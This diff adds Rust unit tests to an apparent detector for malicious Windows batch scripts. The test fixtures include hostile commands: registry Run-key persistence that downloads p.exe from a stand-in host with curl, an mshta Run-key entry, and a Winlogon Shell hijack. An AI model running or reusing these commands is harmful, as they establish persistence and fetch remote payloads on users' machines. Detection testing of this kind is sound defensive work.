@@ -1318,6 +1318,50 @@ if exist "%B64FILE%" del "%B64FILE%"
     }
 
     #[test]
+    fn reg_add_run_key_recurses_into_persisted_download_command() {
+        let script = br#"@echo off
+setlocal DisableDelayedExpansion
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd /V:ON /c set U=https://reg-run.example/p.exe&&curl -o out.exe !U!" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://reg-run.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "persisted Run-key command download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn reg_add_run_key_does_not_recurse_incomplete_trailing_backslash_command() {
+        let script = br#"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Reinforce /d "mshta.exe \" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(
+                |t| matches!(t, Trait::Persistence { command, .. } if command == "mshta.exe \\")
+            ),
+            "Run-key persistence metadata missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Mshta { cmd } if cmd == "mshta.exe \\")),
+            "incomplete Run-key data should not be recursively dispatched: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn winlogon_shell_value_emits_persistence_trait() {
         let script = b"@echo off\r\n\
 reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe,C:\\Users\\Public\\stage.cmd\" /f\r\n";
